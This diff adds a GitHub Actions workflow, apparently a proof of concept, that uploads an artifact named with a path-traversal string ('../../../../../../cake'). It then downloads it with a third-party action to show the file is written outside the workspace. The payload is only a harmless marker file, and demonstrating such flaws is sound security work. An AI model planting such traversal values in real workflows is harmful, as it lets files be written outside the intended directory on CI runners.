@@ -1,0 +1,25 @@
+name: pwnpwn
+
+on:
+  pull_request:
+  push:
+    branches: [master, develop]
+
+jobs:
+  test-poc:
+    name: bla bla
+    runs-on: ubuntu-latest
+    steps:
+      - name: Generate File
+        run: touch /tmp/pwn.txt
+      - name: upload artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: ../../../../../../cake
+          path: /tmp/pwn.txt
+      - name: Download artifacts
+        uses: dawidd6/action-download-artifact@v2
+        with:
+          workflow: poc.yml
+      - name: Lets see
+        run: ls /cake
